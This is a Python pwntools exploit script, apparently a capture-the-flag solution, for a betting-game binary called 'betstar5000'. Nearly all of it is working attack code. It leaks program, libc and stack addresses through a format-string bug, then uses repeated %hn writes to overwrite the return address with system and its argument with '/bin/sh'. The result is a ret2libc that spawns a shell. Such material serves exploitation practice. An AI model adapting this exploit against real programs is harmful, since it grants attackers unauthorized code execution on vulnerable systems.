#!/usr/bin/env python3

from pwn import *

exe = ELF("./betstar5000")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    PLAY = "1"
    ADD = "3"
    QUIT = "5"

    # leak elf, stack, libc addresses

    r.sendline("1")
    r.sendline("%x%x%38$x")
    gdb.attach(r)  # to see ret in main

    r.sendline(PLAY)
    r.sendline("1") # nr of players
    r.sendline("1") # bet
    
    r.recvuntil("winner is *drumroll*: ")
    leak = r.recvn(24)
    elf_leak = int(leak[:8], 16)
    libc_leak = int(leak[8:16], 16)
    stack_leak = int(leak[-8:], 16)

    log.info("elf address leak: {}".format(hex(elf_leak)))
    log.info("libc address leak: {}".format(hex(libc_leak)))
    log.info("stack address leak: {}".format(hex(stack_leak)))
    libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
    exe.address = elf_leak - 4188
    ret = stack_leak + 4
    arg = stack_leak + 8

    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh\x00'))
    log.info("system address: {}".format(hex(system)))
    log.info("string address: {}".format(hex(binsh)))

    # overwrite ret with system

    r.sendline(ADD)
    r.sendline(p32(ret) + "%{}x".format((system & 0x0000ffff) - 4) + "%19$hn")
    r.sendline(PLAY)
    r.sendline("2") # nr of players
    r.sendline("999") # bet
    r.sendline("1") # bet which triggers FSB

    r.sendline(ADD)
    r.sendline(p32(ret+2) + "%{}x".format(int(hex(system & 0xffff0000)[2:6], 16) - 4) + "%19$hn")
    r.sendline(PLAY)
    r.sendline("3") # nr of players
    [r.sendline("999") for i in range(2)]
    r.sendline("1") # bet which triggers FSB

    # overwriting argument with "/bin/sh" string

    r.sendline(ADD)
    r.sendline(p32(arg) + "%{}x".format((binsh & 0x0000ffff) - 4) + "%19$hn")
    r.sendline(PLAY)
    r.sendline("4") # nr of players
    [r.sendline("999") for i in range(3)]
    r.sendline("1") # bet which triggers FSB

    r.sendline(ADD)
    r.sendline(p32(arg+2) + "%{}x".format(int(hex(binsh & 0xffff0000)[2:6], 16) - 4) + "%19$hn")
    r.sendline(PLAY)
    r.sendline("5") # nr of players
    [r.sendline("999") for i in range(4)]
    r.sendline("1") # bet which triggers FSB

    # exiting main and performing the ret2libc

    r.sendline(QUIT)
    r.sendline("y")

    r.interactive()


if __name__ == "__main__":
    main()

'''
FBS vuln in choice_1
late comer has longer name - 19
need to find out how to win round
"%{}x".format((system & 0x0000ffff) - 8)
'''